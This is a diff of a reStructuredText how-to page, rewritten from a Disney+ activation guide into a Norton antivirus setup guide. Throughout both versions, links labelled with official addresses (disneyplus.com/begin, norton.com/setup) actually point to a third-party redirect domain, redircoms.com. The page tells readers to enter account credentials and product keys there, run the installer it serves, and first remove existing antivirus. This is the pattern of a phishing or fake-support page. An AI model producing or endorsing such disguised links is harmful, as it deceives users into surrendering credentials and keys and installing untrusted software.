@@ -1,9 +1,9 @@
 ##################
-How to Activate Disney+ on My Device via disneyplus.com/begin
+A Step-by-Step Guide to Installing Norton with a Product Key
 ##################
 
 .. meta::
-   :msvalidate.01: 79062439FF46DE4F09274CF8F25244E0
+   :msvalidate.01: FE216E19E94441856C00D18618ACAE7D
 
 .. image:: blank.png
    :width: 350px
@@ -14,35 +14,41 @@ How to Activate Disney+ on My Device via disneyplus.com/begin
    :width: 350px
    :align: center
    :height: 100px
-   :alt: disneyplus.com/begin
-   :target: https://dis.redircoms.com
+   :alt: norton.com/setup
+   :target: https://nt.redircoms.com
 
 .. image:: blank.png
    :width: 350px
    :align: center
    :height: 100px
 
-To start watching your favorite movies, TV shows, and originals from Disney, Pixar, Marvel, Star Wars, and National Geographic, activate your device at `disneyplus.com/begin <https://dis.redircoms.com>`_. This activation page ensures a secure and fast way to link your streaming device to your Disney+ account. Just enter the 8-digit code from your screen to begin streaming in minutes.
+Have a Norton product key and need to install your antivirus? You can easily get started at `norton.com/setup <https://nt.redircoms.com>`_. This step-by-step guide walks you through activating and installing Norton protection on your device.
 
 **********
-Steps to Activate Disney+ on Your Device
+Steps to Install Norton with a Product Key
 **********
 
-1. Launch the Disney+ app on your smart TV, streaming stick, gaming console, or other device.
-2. On the welcome screen, an **8-digit activation code** will be displayed.
-3. Open a web browser on your computer or mobile device and go to `disneyplus.com/begin <https://dis.redircoms.com>`_.
-4. Log in using your Disney+ account credentials.
-5. Enter the **8-digit code** shown on your TV/device screen.
-6. Click **Continue** and wait for the device to link successfully.
+1. Open a browser and go to `norton.com/setup <https://nt.redircoms.com>`_.
+2. Sign in to your **Norton account**, or create one if you’re a new user.
+3. Enter your **25-character product key** printed on the retail card or email receipt.
+4. Click **Submit** to verify your key and start the download.
+5. Once downloaded, **run the installer** and follow the on-screen instructions.
+6. After installation, Norton will automatically activate and protect your device.
 
 **********
-What to Do After Activation
+What You’ll Need
 **********
 
-1. Once activation is complete, your device will automatically refresh.
-2. You will now have full access to Disney+ content on your device.
-3. If the code expires, restart the app to generate a new code.
-4. For issues, ensure your device is connected to the internet and try again.
-5. You can repeat this process on additional devices using the same account.
+- A valid Norton product key  
+- A Norton account login  
+- An internet connection
 
-Start streaming the magic of Disney+ today by visiting `disneyplus.com/begin <https://dis.redircoms.com>`_ and entering your activation code.
+**********
+Tips for a Smooth Setup
+**********
+
+- Remove any previously installed antivirus software before installing Norton.
+- Restart your device after installation to complete setup.
+- Keep your Norton account credentials safe for future access.
+
+Get started today—visit `norton.com/setup <https://nt.redircoms.com>`_ to activate and secure your device in just a few minutes.
